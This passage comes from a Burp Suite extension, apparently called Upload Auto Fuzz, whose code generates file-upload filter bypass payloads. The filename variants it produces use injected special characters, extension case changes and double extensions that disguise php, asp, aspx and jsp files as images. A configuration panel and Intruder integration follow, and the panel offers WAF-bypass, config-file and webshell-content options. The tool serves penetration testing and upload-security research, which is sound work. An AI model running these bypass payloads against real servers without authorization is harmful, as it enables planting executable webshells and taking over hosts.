        ' ', '\t', '\n', '\r',
        '/', '\\', ':', '*', '?', '"', '<', '>', '|',
        ';', '&', '$', '`', "'", '#', '@', '!', '^',
    ]
    
    def generate(self, template, filename, extension, content_type):
        """Generate special character injection payloads."""
        _, _, filename_match = extract_filename_parts(template)
        if not filename_match:
            return
        
        base_name = filename.rsplit('.', 1)[0] if '.' in filename else filename
        
        for lang in self.config.target_languages:
            ext = BACKEND_LANGUAGES[lang][0]
            
            for char in self.SPECIAL_CHARS:
                # Character before extension
                pattern1 = '{}{}.{}'.format(base_name, char, ext)
                yield self._replace_filename(template, filename_match, pattern1)
                
                # Character after extension
                pattern2 = '{}.{}{}'.format(base_name, ext, char)
                yield self._replace_filename(template, filename_match, pattern2)
                
                # Character in middle of extension (e.g., sh;ell.php -> p;hp)
                if len(ext) >= 2:
                    mid = len(ext) // 2
                    pattern3 = '{}.{}{}{}'.format(base_name, ext[:mid], char, ext[mid:])
                    yield self._replace_filename(template, filename_match, pattern3)
                
                # Character between filename and dot
                pattern4 = '{}{}.{}'.format(base_name, char, ext)
                yield self._replace_filename(template, filename_match, pattern4)
            
            # 空格在点后面 (shell. php)
            yield self._replace_filename(template, filename_match, '{}. {}'.format(base_name, ext))
            
            # 多个点
            yield self._replace_filename(template, filename_match, '{}...{}'.format(base_name, ext))
            yield self._replace_filename(template, filename_match, '{}.....{}'.format(base_name, ext))


class CaseVariationStrategy(FuzzStrategy):
    """
    Strategy for extension case variation bypass.
    
    Tests various case combinations of file extensions.
    """
    
    name = "case_variation"
    description = "Extension case variation bypass"
    category = "case_variation"
    
    def generate(self, template, filename, extension, content_type):
        """Generate case variation payloads."""
        _, _, filename_match = extract_filename_parts(template)
        if not filename_match:
            return
        
        base_name = filename.rsplit('.', 1)[0] if '.' in filename else filename
        
        for lang in self.config.target_languages:
            ext = BACKEND_LANGUAGES[lang][0]
            
            # Generate case variations
            variations = self._generate_case_variations(ext)
            
            for var in variations:
                yield self._replace_filename(template, filename_match,
                                            '{}.{}'.format(base_name, var))
    
    def _generate_case_variations(self, ext):
        """Generate all meaningful case variations of an extension."""
        if len(ext) > 5:
            # For long extensions, just do basic variations
            return [ext.upper(), ext.lower(), ext.capitalize()]
        
        variations = set()
        
        # Basic variations
        variations.add(ext.upper())
        variations.add(ext.lower())
        variations.add(ext.capitalize())
        
        # Mixed case (first and last different)
        if len(ext) >= 2:
            variations.add(ext[0].upper() + ext[1:].lower())
            variations.add(ext[0].lower() + ext[1:].upper())
            variations.add(ext[:-1].lower() + ext[-1].upper())
        
        # Alternating case
        if len(ext) >= 3:
            alt1 = ''.join(c.upper() if i % 2 == 0 else c.lower() 
                         for i, c in enumerate(ext))
            alt2 = ''.join(c.lower() if i % 2 == 0 else c.upper() 
                         for i, c in enumerate(ext))
            variations.add(alt1)
            variations.add(alt2)
        
        return list(variations)


class DoubleExtensionStrategy(FuzzStrategy):
    """
    Strategy for double/multiple extension bypass.
    
    Exploits servers that only check the last or first extension.
    """
    
    name = "double_extension"
    description = "Double/multiple extension bypass"
    category = "double_extension"
    
    # Allowed extensions to combine with
    ALLOWED_EXTENSIONS = ['jpg', 'jpeg', 'png', 'gif', 'bmp', 'txt', 'pdf', 'doc']
    
    def generate(self, template, filename, extension, content_type):
        """Generate double extension payloads."""
        _, _, filename_match = extract_filename_parts(template)
        if not filename_match:
            return
        
        base_name = filename.rsplit('.', 1)[0] if '.' in filename else filename
        
        for lang in self.config.target_languages:
            ext = BACKEND_LANGUAGES[lang][0]
            
            for allowed in self.ALLOWED_EXTENSIONS:
                # Executable first, allowed second
                yield self._replace_filename(template, filename_match,
                                            '{}.{}.{}'.format(base_name, ext, allowed))
                
                # Allowed first, executable second
                yield self._replace_filename(template, filename_match,
                                            '{}.{}.{}'.format(base_name, allowed, ext))
                
                # Triple extension
                yield self._replace_filename(template, filename_match,
                                            '{}.{}.{}.{}'.format(base_name, allowed, ext, allowed))


# =============================================================================
# Payload Factory
# =============================================================================

class PayloadFactory(object):
    """
    Factory class for managing and executing fuzzing strategies.
    
    Responsibilities:
    - Strategy registration and management
    - Coordinated payload generation
    - Deduplication and limiting
    """
    
    def __init__(self, config=None):
        """
        Initialize the factory with configuration.
        
        Args:
            config: FuzzConfig instance or None for default
        """
        self.config = config or FuzzConfig()
        self._strategies = {}
        self._register_default_strategies()
    
    def _register_default_strategies(self):
        """Register all built-in strategies."""
        default_strategies = [
            SuffixBypassStrategy,
            ContentDispositionStrategy,
            ContentTypeStrategy,
            WindowsFeaturesStrategy,
            LinuxFeaturesStrategy,
            MagicBytesStrategy,
            NullByteStrategy,
            EncodingStrategy,
            WAFBypassStrategy,
            ConfigFileStrategy,
            WebShellContentStrategy,
            SpecialCharacterStrategy,
            CaseVariationStrategy,
            DoubleExtensionStrategy,
        ]
        
        for strategy_class in default_strategies:
            self.register_strategy(strategy_class)
    
    def register_strategy(self, strategy_class):
        """
        Register a new strategy.
        
        Args:
            strategy_class: Class inheriting from FuzzStrategy
        """
        strategy = strategy_class(self.config)
        self._strategies[strategy.name] = strategy
        Logger.debug("Registered strategy: {}".format(strategy.name))
    
    def unregister_strategy(self, name):
        """
        Unregister a strategy by name.
        
        Args:
            name: Strategy name to remove
        """
        if name in self._strategies:
            del self._strategies[name]
    
    def get_strategy(self, name):
        """
        Get a strategy by name.
        
        Args:
            name: Strategy name
        
        Returns:
            FuzzStrategy instance or None
        """
        return self._strategies.get(name)
    
    def list_strategies(self):
        """
        List all registered strategies.
        
        Returns:
            List of (name, description) tuples
        """
        return [(s.name, s.description) for s in self._strategies.values()]
    
    def generate_payloads(self, template):
        """
        Generate all payloads for a given template.
        
        This is the main entry point for payload generation. It:
        1. Parses the template to extract filename and content-type
        2. Runs all enabled strategies
        3. Deduplicates results
        4. Limits to max_payloads
        
        Args:
            template: HTTP request template string
        
        Returns:
            List of unique payload strings
        """
        # Parse template
        filename, extension, _ = extract_filename_parts(template)
        content_type = extract_content_type(template)
        
        if not filename:
            Logger.error("Could not extract filename from template")
            return [template]  # Return original as fallback
        
        Logger.info("Generating payloads for: {} (ext: {})".format(filename, extension))
        
        # Collect payloads from all enabled strategies
        seen_hashes = set()
        payloads = []
        
        for name, strategy in self._strategies.items():
            if not self.config.is_strategy_enabled(strategy.category):
                Logger.debug("Skipping disabled strategy: {}".format(name))
                continue
            
            try:
                for payload in strategy.generate(template, filename, extension, content_type):
                    if payload is None:
                        continue
                    
                    # Deduplicate using hash
                    payload_hash = compute_payload_hash(payload)
                    if payload_hash in seen_hashes:
                        continue
                    
                    seen_hashes.add(payload_hash)
                    payloads.append(payload)
                    
                    # Check limit
                    if len(payloads) >= self.config.max_payloads:
                        Logger.warn("Reached max payload limit: {}".format(self.config.max_payloads))
                        return payloads
                        
            except Exception as e:
                Logger.error("Strategy {} failed: {}".format(name, str(e)))
                continue
        
        Logger.info("Generated {} unique payloads".format(len(payloads)))
        return payloads


# =============================================================================
# Burp Suite Integration
# =============================================================================

class ConfigPanel(JPanel):
    """
    Professional configuration panel for Upload Auto Fuzz.
    
    Provides comprehensive UI controls for:
    - Target language selection with visual feedback
    - Strategy category enable/disable
    - Real-time configuration status
    - Automatic dark/light theme support
    """
    
    def __init__(self, config):
        """
        Initialize the configuration panel.
        
        Args:
            config: FuzzConfig instance
        """
        JPanel.__init__(self)
        self.config = config
        self._init_ui()
    
    def _get_colors(self):
        """
        Get colors based on current Burp theme (dark or light).
        
        Returns:
            Dictionary with color values for different UI elements
        """
        # Try to detect dark theme by checking background color
        bg = UIManager.getColor("Panel.background")
        
        if bg is not None:
            # Calculate luminance to detect dark theme
            luminance = (0.299 * bg.getRed() + 0.587 * bg.getGreen() + 0.114 * bg.getBlue()) / 255
            is_dark = luminance < 0.5
        else:
            is_dark = False
        
        if is_dark:
            # Dark theme colors
            return {
                'bg': UIManager.getColor("Panel.background") or Color(43, 43, 43),
                'fg': UIManager.getColor("Panel.foreground") or Color(187, 187, 187),
                'text_bg': Color(60, 63, 65),
                'text_fg': Color(187, 187, 187),
                'border': Color(85, 85, 85),
                'title_fg': Color(200, 200, 200),
            }
        else:
            # Light theme colors
            return {
                'bg': UIManager.getColor("Panel.background") or Color(255, 255, 255),
                'fg': UIManager.getColor("Panel.foreground") or Color(0, 0, 0),
                'text_bg': Color(245, 245, 245),
                'text_fg': Color(0, 0, 0),
                'border': Color(200, 200, 200),
                'title_fg': Color(0, 0, 0),
            }
    
    def _init_ui(self):
        """Initialize UI components with professional layout."""
        colors = self._get_colors()
        
        self.setLayout(BorderLayout(10, 10))
        self.setBorder(BorderFactory.createEmptyBorder(15, 15, 15, 15))
        
        # ===== Header Panel =====
        header_panel = JPanel(BorderLayout())
        header_panel.setBorder(BorderFactory.createEmptyBorder(0, 0, 15, 0))
        header_panel.setOpaque(False)
        
        title_label = JLabel("Upload Auto Fuzz v{}".format(VERSION))
        title_label.setFont(Font("SansSerif", Font.BOLD, 18))
        header_panel.add(title_label, BorderLayout.WEST)
        
        subtitle_label = JLabel("File Upload Vulnerability Testing Tool")
        subtitle_label.setFont(Font("SansSerif", Font.PLAIN, 12))
        header_panel.add(subtitle_label, BorderLayout.SOUTH)
        
        self.add(header_panel, BorderLayout.NORTH)
        
        # ===== Main Content Panel (Split) =====
        main_panel = JPanel(GridBagLayout())
        main_panel.setOpaque(False)
        gbc = GridBagConstraints()
        gbc.fill = GridBagConstraints.BOTH
        gbc.insets = Insets(5, 5, 5, 5)
        
        # ----- Left Column: Language Selection -----
        lang_panel = self._create_language_panel(colors)
        gbc.gridx = 0
        gbc.gridy = 0
        gbc.weightx = 0.4
        gbc.weighty = 0.6
        main_panel.add(lang_panel, gbc)
        
        # ----- Right Column: Strategy Selection -----
        strategy_panel = self._create_strategy_panel(colors)
        gbc.gridx = 1
        gbc.gridy = 0
        gbc.weightx = 0.6
        gbc.weighty = 0.6
        main_panel.add(strategy_panel, gbc)
        
        # ----- Bottom Row: Settings -----
        settings_panel = self._create_settings_panel(colors)
        gbc.gridx = 0
        gbc.gridy = 1
        gbc.gridwidth = 2
        gbc.weightx = 1.0
        gbc.weighty = 0.1
        main_panel.add(settings_panel, gbc)
        
        # ----- Status Panel -----
        status_panel = self._create_status_panel(colors)
        gbc.gridx = 0
        gbc.gridy = 2
        gbc.gridwidth = 2
        gbc.weightx = 1.0
        gbc.weighty = 0.3
        main_panel.add(status_panel, gbc)
        
        self.add(main_panel, BorderLayout.CENTER)
        
        # ===== Footer Panel =====
        footer_panel = JPanel(FlowLayout(FlowLayout.LEFT))
        footer_panel.setOpaque(False)
        footer_label = JLabel("Author: T3nk0 | GitHub: github.com/T3nk0/Upload_Auto_Fuzz")
        footer_label.setFont(Font("SansSerif", Font.ITALIC, 10))
        footer_panel.add(footer_label)
        self.add(footer_panel, BorderLayout.SOUTH)
        
        # Update status display
        self._update_status()
    
    def _create_language_panel(self, colors):
        """Create the language selection panel."""
        panel = JPanel()
        panel.setLayout(BoxLayout(panel, BoxLayout.Y_AXIS))
        panel.setBorder(BorderFactory.createTitledBorder(
            BorderFactory.createLineBorder(colors['border']),
            "Target Backend Languages",
            TitledBorder.LEFT,
            TitledBorder.TOP,
            Font("SansSerif", Font.BOLD, 12),
            colors['title_fg']
        ))
        
        # Description
        desc_panel = JPanel(FlowLayout(FlowLayout.LEFT))
        desc_panel.setOpaque(False)
        desc_label = JLabel("Select languages to generate payloads for:")
        desc_label.setFont(Font("SansSerif", Font.PLAIN, 11))
        desc_panel.add(desc_label)
        panel.add(desc_panel)
        
        # Language checkboxes with extension info
        self._lang_checkboxes = {}
        lang_info = {
            'php': 'PHP (.php, .phtml, .phar, etc.)',
            'asp': 'ASP (.asp, .asa, .cer, etc.)',
            'aspx': 'ASP.NET (.aspx, .ashx, .asmx)',
            'jsp': 'JSP (.jsp, .jspx, .jspa, etc.)'
        }
        
        for lang, description in lang_info.items():
            cb_panel = JPanel(FlowLayout(FlowLayout.LEFT))
            cb_panel.setOpaque(False)
            cb = JCheckBox(description, lang in self.config.target_languages)
            cb.setFont(Font("SansSerif", Font.PLAIN, 12))
            cb.setOpaque(False)
            cb.addActionListener(lambda e, l=lang: self._on_language_toggle(l))
            self._lang_checkboxes[lang] = cb
            cb_panel.add(cb)
            panel.add(cb_panel)
        
        # Select All / Deselect All buttons
        btn_panel = JPanel(FlowLayout(FlowLayout.LEFT))
        btn_panel.setOpaque(False)
        select_all_btn = JButton("Select All")
        select_all_btn.addActionListener(lambda e: self._select_all_languages(True))
        deselect_all_btn = JButton("Deselect All")
        deselect_all_btn.addActionListener(lambda e: self._select_all_languages(False))
        btn_panel.add(select_all_btn)
        btn_panel.add(deselect_all_btn)
        panel.add(btn_panel)
        
        return panel
    
    def _create_strategy_panel(self, colors):
        """Create the strategy selection panel."""
        panel = JPanel(BorderLayout())
        panel.setBorder(BorderFactory.createTitledBorder(
            BorderFactory.createLineBorder(colors['border']),
            "Fuzzing Strategies",
            TitledBorder.LEFT,
            TitledBorder.TOP,
            Font("SansSerif", Font.BOLD, 12),
            colors['title_fg']
        ))
        
        # Strategy checkboxes in scrollable panel
        inner_panel = JPanel()
        inner_panel.setLayout(BoxLayout(inner_panel, BoxLayout.Y_AXIS))
        
        # Strategy descriptions (Chinese with technical terms preserved)
        strategy_info = {
            'suffix': u'后缀绕过 - 可执行文件扩展名变体',
            'content_disposition': u'请求头操控 - Content-Disposition 绕过技术',
            'content_type': u'MIME类型伪造 - Content-Type 绕过',
            'windows_features': u'Windows特性 - NTFS ADS、保留设备名',
            'linux_features': u'Linux特性 - 路径穿越、Apache多扩展名',
            'magic_bytes': u'魔术字节 - 文件头签名伪造',
            'null_byte': u'空字节注入 - 截断攻击',
            'double_extension': u'双扩展名 - 多重扩展名绕过',
            'case_variation': u'大小写变换 - 扩展名大小写混淆',
            'special_chars': u'特殊字符 - 文件名注入',
            'encoding': u'编码绕过 - URL/Unicode编码',
            'waf_bypass': u'WAF绕过 - 防火墙规避技术',
            'webshell_content': u'WebShell内容 - 恶意载荷注入',
            'config_files': u'配置文件 - .htaccess、web.config上传',
        }
        
        self._strategy_checkboxes = {}
        for strategy_name, description in strategy_info.items():
            cb_panel = JPanel(FlowLayout(FlowLayout.LEFT))
            cb_panel.setOpaque(False)
            enabled = self.config.enabled_strategies.get(strategy_name, True)
            cb = JCheckBox(description, enabled)
            cb.setFont(Font("SansSerif", Font.PLAIN, 11))
            cb.setOpaque(False)
            cb.addActionListener(lambda e, s=strategy_name: self._on_strategy_toggle(s))
            self._strategy_checkboxes[strategy_name] = cb
            cb_panel.add(cb)
            inner_panel.add(cb_panel)
        
        scroll = JScrollPane(inner_panel)
        scroll.setPreferredSize(Dimension(400, 250))
        scroll.getViewport().setOpaque(False)
        panel.add(scroll, BorderLayout.CENTER)
        
        # Select All / Deselect All buttons
        btn_panel = JPanel(FlowLayout(FlowLayout.LEFT))
        btn_panel.setOpaque(False)
        select_all_btn = JButton("Enable All")
        select_all_btn.addActionListener(lambda e: self._select_all_strategies(True))
        deselect_all_btn = JButton("Disable All")
        deselect_all_btn.addActionListener(lambda e: self._select_all_strategies(False))
        btn_panel.add(select_all_btn)
        btn_panel.add(deselect_all_btn)
        panel.add(btn_panel, BorderLayout.SOUTH)
        
        return panel
    
    def _create_settings_panel(self, colors):
        """Create the settings panel."""
        panel = JPanel(FlowLayout(FlowLayout.LEFT, 20, 10))
        panel.setBorder(BorderFactory.createTitledBorder(
            BorderFactory.createLineBorder(colors['border']),
            "Generation Settings",
            TitledBorder.LEFT,
            TitledBorder.TOP,
            Font("SansSerif", Font.BOLD, 12),
            colors['title_fg']
        ))
        
        # WebShell content toggle
        self._webshell_cb = JCheckBox("Include WebShell Content", self.config.include_webshell)
        self._webshell_cb.setFont(Font("SansSerif", Font.PLAIN, 12))
        self._webshell_cb.setOpaque(False)
        self._webshell_cb.addActionListener(lambda e: self._on_webshell_toggle())
        panel.add(self._webshell_cb)
        
        return panel
    
    def _create_status_panel(self, colors):
        """Create the status display panel."""
        panel = JPanel(BorderLayout())
        panel.setBorder(BorderFactory.createTitledBorder(
            BorderFactory.createLineBorder(colors['border']),
            "Current Configuration Status",
            TitledBorder.LEFT,
            TitledBorder.TOP,
            Font("SansSerif", Font.BOLD, 12),
            colors['title_fg']
        ))
        
        self._status_area = JTextArea(4, 50)
        self._status_area.setEditable(False)
        self._status_area.setFont(Font("Monospaced", Font.PLAIN, 11))
        self._status_area.setBackground(colors['text_bg'])
        self._status_area.setForeground(colors['text_fg'])
        
        scroll = JScrollPane(self._status_area)
        panel.add(scroll, BorderLayout.CENTER)
        
        return panel
    
    def _on_language_toggle(self, lang):
        """Handle language checkbox toggle."""
        cb = self._lang_checkboxes[lang]
        if cb.isSelected():
            if lang not in self.config.target_languages:
                self.config.target_languages.append(lang)
        else:
            if lang in self.config.target_languages:
                self.config.target_languages.remove(lang)
        self._update_status()
    
    def _on_strategy_toggle(self, strategy):
        """Handle strategy checkbox toggle."""
        cb = self._strategy_checkboxes[strategy]
        self.config.enable_strategy(strategy, cb.isSelected())
        self._update_status()
    
    def _on_webshell_toggle(self):
        """Handle webshell content toggle."""
        self.config.include_webshell = self._webshell_cb.isSelected()
        self._update_status()
    
    def _select_all_languages(self, select):
        """Select or deselect all languages."""
        for lang, cb in self._lang_checkboxes.items():
            cb.setSelected(select)
            if select:
                if lang not in self.config.target_languages:
                    self.config.target_languages.append(lang)
            else:
                if lang in self.config.target_languages:
                    self.config.target_languages.remove(lang)
        self._update_status()
    
    def _select_all_strategies(self, select):
        """Enable or disable all strategies."""
        for strategy, cb in self._strategy_checkboxes.items():
            cb.setSelected(select)
            self.config.enable_strategy(strategy, select)
        self._update_status()
    
    def _update_status(self):
        """Update the status display with current configuration."""
        enabled_strategies = sum(1 for v in self.config.enabled_strategies.values() if v)
        total_strategies = len(self.config.enabled_strategies)
        
        status_text = u"""Configuration Summary:
  - Target Languages: {}
  - Enabled Strategies: {}/{}
  - WebShell Content: {}

Ready to generate payloads. Select payload positions in Intruder and choose "{}".
""".format(
            ', '.join(self.config.target_languages) if self.config.target_languages else 'None (select at least one!)',
            enabled_strategies,
            total_strategies,
            'Enabled' if self.config.include_webshell else 'Disabled',
            EXTENSION_NAME
        )
        
        self._status_area.setText(status_text)


class BurpExtender(IBurpExtender, IIntruderPayloadGeneratorFactory, ITab):
    """
    Main Burp Suite extension class.
    
    Implements:
    - IBurpExtender: Extension entry point
    - IIntruderPayloadGeneratorFactory: Intruder payload generation
    - ITab: Configuration UI tab
    """
    
    def registerExtenderCallbacks(self, callbacks):
        """
        Extension entry point called by Burp Suite.
        
        Args:
            callbacks: IBurpExtenderCallbacks instance
        """
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()
        
        # Initialize logger
        Logger.init(callbacks)
        
        # Reset and initialize configuration (ensure fresh state)
        FuzzConfig.reset()
        self._config = FuzzConfig()
        
        # Initialize payload factory
        self._factory = PayloadFactory(self._config)
        
        # Set extension name
        callbacks.setExtensionName(EXTENSION_NAME)
        
        # Register as Intruder payload generator
        callbacks.registerIntruderPayloadGeneratorFactory(self)
        
        # Create and register UI tab
        self._panel = ConfigPanel(self._config)
        callbacks.addSuiteTab(self)
        
        # Print banner
        self._print_banner()
    
    def _print_banner(self):
        """Print extension banner to output."""
        banner = """
================================================================================
  Upload Auto Fuzz v{}
================================================================================
  A comprehensive file upload vulnerability testing tool
  
  Features:
    - {} fuzzing strategies
    - Configurable target languages: {}
    - Intelligent payload deduplication
    - Configurable payload limits
  
  Author: T3nk0
  GitHub: https://github.com/T3nk0/Upload_Auto_Fuzz
================================================================================
""".format(
            VERSION,
            len(self._factory._strategies),
            ', '.join(BACKEND_LANGUAGES.keys())
        )
        print(banner)
    
    # IIntruderPayloadGeneratorFactory implementation
    
    def getGeneratorName(self):
        """
        Return the name displayed in Intruder payload type dropdown.
        
        Returns:
            Extension name string
        """
        return EXTENSION_NAME
    
    def createNewInstance(self, attack):
        """
        Create a new payload generator instance for an Intruder attack.
        
        Args:
            attack: IIntruderAttack instance
        
        Returns:
            IIntruderPayloadGenerator instance
        """
        return UploadFuzzer(self._factory, attack)
    
    # ITab implementation
    
    def getTabCaption(self):
        """
        Return the tab caption for the configuration panel.
        
        Returns:
            Tab caption string
        """
        return "Upload Fuzz"
    
    def getUiComponent(self):
        """
        Return the UI component for the configuration tab.
        
        Returns:
            JPanel instance
        """
        return self._panel


class UploadFuzzer(IIntruderPayloadGenerator):
    """
    Intruder payload generator implementation.
    
    Generates payloads on-demand for Intruder attacks, using the
    PayloadFactory for actual payload generation.
    """
    
    def __init__(self, factory, attack):
        """
        Initialize the fuzzer.
        
        Args:
            factory: PayloadFactory instance
            attack: IIntruderAttack instance
        """
        self._factory = factory
        self._attack = attack
        self._payloads = None
        self._index = 0
        self._initialized = False
    
    def hasMorePayloads(self):
        """
        Check if more payloads are available.
        
        Returns:
            True if more payloads available, False otherwise
        """
        if not self._initialized:
            return True
        return self._index < len(self._payloads)
    
    def getNextPayload(self, baseValue):
        """
        Get the next payload.
        
        Args:
            baseValue: Byte array of the selected Intruder position
        
        Returns:
            Next payload as string
        """
        # Initialize payloads on first call
        if not self._initialized:
            self._initialize_payloads(baseValue)
        
        # Return next payload
        if self._index < len(self._payloads):
            payload = self._payloads[self._index]
            self._index += 1
            return payload
        
        return ""
    
    def _initialize_payloads(self, baseValue):
        """
        Initialize payloads from the base value.
        
        Args:
            baseValue: Byte array of selected content
        """
        try:
            # Convert byte array to string
            template = self._bytes_to_string(baseValue)
            
            # Validate template
            if not self._validate_template(template):
                Logger.error("Invalid template - missing required components")
                self._payloads = [template]
            else:
                # Generate payloads
                self._payloads = self._factory.generate_payloads(template)
            
            Logger.info("Initialized with {} payloads".format(len(self._payloads)))
            
        except Exception as e:
            Logger.error("Failed to initialize payloads: {}".format(str(e)))
            self._payloads = []
        
        self._initialized = True
    
    def _bytes_to_string(self, byte_array):
        """
        Convert Java byte array to Python string.
        
        Args:
            byte_array: Java byte array
        
        Returns:
            Python string
        """
        try:
            # Handle both positive and negative byte values
            return "".join(chr(b & 0xff) for b in byte_array)
        except Exception as e:
            Logger.error("Byte conversion failed: {}".format(str(e)))
            return ""
    
    def _validate_template(self, template):
        """
        Validate that template contains required components.
        
        Args:
            template: Template string
        
        Returns:
            True if valid, False otherwise
        """
        # Must have filename
        if 'filename=' not in template and 'filename"=' not in template:
            return False
        
        # Should have Content-Disposition or Content-Type
        if 'Content-Disposition' not in template and 'Content-Type' not in template:
            return False
        
        return True
    
    def reset(self):
        """Reset the generator to start from the beginning."""
        self._index = 0
        Logger.debug("Generator reset")


# =============================================================================
# Standalone Testing Support (Only runs when executed directly, not when imported)
# =============================================================================

def run_standalone_test():
    """
    Run standalone tests without Burp Suite.
    
    Useful for development and debugging.
    This function is NOT called automatically when loaded as a Burp extension.
    """
    print("Running standalone test...")
    
    # Sample template
    template = '''Content-Disposition: form-data; name="file"; filename="test.jpg"
Content-Type: image/jpeg

[binary content]'''
    
    # Create a fresh config instance (bypass singleton for testing)
    FuzzConfig.reset()
    config = FuzzConfig()
    config.target_languages = ['php']  # Test with PHP only
    config.max_payloads = 50  # Limit for testing
    
    factory = PayloadFactory(config)
    
    # Generate payloads
    payloads = factory.generate_payloads(template)
    
    print("\nGenerated {} payloads:".format(len(payloads)))
    for i, payload in enumerate(payloads[:10]):  # Show first 10
        print("\n--- Payload {} ---".format(i + 1))
        print(payload[:200] + "..." if len(payload) > 200 else payload)
    
    if len(payloads) > 10:
        print("\n... and {} more payloads".format(len(payloads) - 10))
    
    # Reset singleton for potential Burp loading
    FuzzConfig.reset()


# Only run standalone test when executed directly (not when imported by Burp)
# In Jython/Burp environment, __name__ is typically the module name, not "__main__"
if __name__ == "__main__":
    run_standalone_test()
